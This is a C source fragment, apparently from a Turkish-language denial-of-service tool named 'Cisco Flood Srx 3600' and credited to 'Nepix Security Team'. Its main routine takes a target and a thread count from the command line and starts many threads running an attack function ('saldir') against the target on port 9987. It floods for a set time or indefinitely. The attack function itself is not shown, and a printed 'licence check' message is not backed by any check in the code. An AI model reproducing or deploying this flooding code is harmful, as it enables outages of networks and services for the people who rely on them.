int bypasslabakalim(int kontrol, char *durum[ ])
{
        if(kontrol < 4){
        	    fprintf(stdout, "Cisco Flood Srx 3600 Pakat Gonderici ...\n");
                fprintf(stderr, "MR.HASAN !\n");
                fprintf(stderr, "NEPİX SECURİTY TEAM ! \n");
                fprintf(stdout, "NEPİX TEAM \n", durum[0]);
                exit(-1);
        }

    
 
 
        int i = 0;
        fprintf(stdout, "Lisans Kontrolu Yapiliyor Lisansiniz Yoksa İletisime Geciniz...\n");
        int max_paket = 128;
        char *veri = (char *) malloc(max_paket);
        veri = memset(veri, 0x00, max_paket);
        int islemcimiktari = atoi(durum[3]);
        pthread_t cekirdek[islemcimiktari];
        struct cekirdek_verisi td[islemcimiktari];
		portumuz = 9987;
        for(i = 0;i<islemcimiktari;i++){
                pthread_create( &cekirdek[i], NULL, &saldir, (void *) durum[1]);
        }
        fprintf(stdout, "İstanbul Sabiha Gökcen Havalimani İyi Uçuşlar Diler....\n");
        fprintf(stdout, "Coded By: Hasan Atilan \n");
        if(kontrol > 4)
        {
                sleep(atoi(durum[4]));
        } else {
                while(1){
                        sleep(1);
                }
        }
        return 0;
}
